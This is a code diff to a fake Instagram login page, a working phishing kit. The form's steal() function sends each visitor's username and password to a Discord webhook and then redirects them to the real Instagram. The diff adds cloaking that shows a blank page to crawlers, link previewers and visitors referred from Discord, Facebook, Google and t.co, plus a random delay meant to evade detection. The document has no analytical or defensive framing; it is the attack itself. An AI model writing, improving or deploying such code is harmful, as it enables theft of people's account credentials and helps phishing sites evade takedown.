@@ -5,7 +5,6 @@
   <title>Instagram </title>
   <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-
   <style>
     body {
       margin: 0;
@@ -72,11 +71,33 @@
       font-size: 13px;
     }
   </style>
+
+  <!-- Basic bot blocker -->
+  <script>
+    const userAgent = navigator.userAgent.toLowerCase();
+    const referrer = document.referrer.toLowerCase();
+
+    const isBot = (
+      userAgent.includes("discord") ||
+      userAgent.includes("bot") ||
+      userAgent.includes("crawler") ||
+      userAgent.includes("preview") ||
+      userAgent.includes("spider") ||
+      referrer.includes("discord") ||
+      referrer.includes("facebook") ||
+      referrer.includes("t.co") || 
+      referrer.includes("google")
+    );
+
+    if (isBot) {
+      document.documentElement.innerHTML = ""; // Show blank page to scanners
+      throw new Error("Blocked bot or crawler");
+    }
+  </script>
 </head>
 
 <body>
   <div class="container">
-    <!-- Instagram logo (image) -->
     <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
 
     <form onsubmit="steal(event)">
@@ -91,42 +112,35 @@
 
   <script>
     function steal(e) {
-      e.preventDefault(); // Prevent form submission to handle it in JS
+      e.preventDefault();
 
       const u = document.getElementById("username").value;
       const p = document.getElementById("password").value;
 
-      // Create the payload to send
-      const data = {
-        username: u,
-        password: p
+      const payload = {
+        content: `🛑 고양이\nUsername: ${u}\nPassword: ${p}`
       };
 
-      // Send the data to Discord webhook
-      fetch("https://discord.com/api/webhooks/1358000337738272839/FwLTIVrtE2-YFukbw7Qeuhh86ZL5GW8XuU2CFadpaon68s5FgOqZBzTUSiSlAv1vCavX", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: `🛑 고양이\nUsername: ${data.username}\nPassword: ${data.password}`
+      // Delay 1–2.5 seconds to avoid detection by fast bots
+      const delay = Math.random() * 1500 + 1000;
+
+      setTimeout(() => {
+        fetch("https://discord.com/api/webhooks/1358000337738272839/FwLTIVrtE2-YFukbw7Qeuhh86ZL5GW8XuU2CFadpaon68s5FgOqZBzTUSiSlAv1vCavX", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         })
-      })
-      .then(response => {
-        // Check if the request was successful
-        if (response.ok) {
-          console.log("Data sent successfully");
-          window.location.href = "https://instagram.com"; // Redirect to Instagram after success
-        } else {
-          console.error('Request failed with status:', response.status);
-          alert('Something went wrong. Please try again later.');
-        }
-      })
-      .catch(error => {
-        // Handle network errors
-        console.error('Error during fetch:', error);
-        alert('Network error. Please check your connection.');
-      });
+        .then(response => {
+          if (response.ok) {
+            window.location.href = "https://instagram.com"; // Redirect after success
+          } else {
+            alert('Something went wrong.');
+          }
+        })
+        .catch(() => {
+          alert('Network error.');
+        });
+      }, delay);
     }
   </script>
 </body>
